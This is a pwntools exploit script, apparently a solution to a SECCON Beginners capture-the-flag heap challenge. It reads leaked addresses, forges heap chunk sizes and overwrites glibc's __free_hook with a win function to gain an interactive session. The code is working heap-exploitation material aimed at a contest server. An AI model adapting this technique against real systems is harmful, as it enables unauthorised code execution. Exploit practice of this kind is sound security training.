from pwn import *

io = remote("bh.quals.beginners.seccon.jp", 9002)
io.recvuntil("<__free_hook>: ")
hook = int(io.recvline(),0)
io.recvuntil("<win>: ")
win = int(io.recvline(),0)
io.sendline("2")
io.sendline("")
sleep(1)
io.sendline("3")
sleep(1)
io.sendline("1")
io.send(p64(hook))
io.send(p64(hook))
io.send(p64(hook))
io.send(p64(0x21))
io.send(p64(hook))
io.sendline(p64(hook))
sleep(1)
io.sendline("1")
io.send(p64(hook))
io.send(p64(hook))
io.send(p64(hook))
io.send(p64(0x41))
io.send(p64(hook))
io.sendline(p64(hook))

sleep(1)
io.sendline("2")
io.sendline(p64(win))

sleep(1)
io.sendline("3")

sleep(1)
io.sendline("2")
io.sendline(p64(win))

sleep(1)
io.sendline("3")

io.interactive()
